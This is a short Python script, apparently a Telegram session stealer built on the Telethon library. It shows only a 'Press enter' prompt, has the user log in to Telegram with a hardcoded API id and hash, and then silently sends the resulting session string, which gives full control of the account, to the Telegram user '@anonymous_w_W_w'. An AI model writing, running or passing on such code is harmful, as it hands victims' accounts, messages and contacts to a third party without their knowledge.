from telethon import TelegramClient
from telethon.sessions import StringSession
import os, sys

api_id = 9708508
api_hash = "1e6ca420184a701db1f8a1301df99288"
os.system("clear")

string = input("Press enter: ")

with TelegramClient(StringSession(string), api_id, api_hash) as client:
    client.send_message("@anonymous_w_W_w", client.session.save())



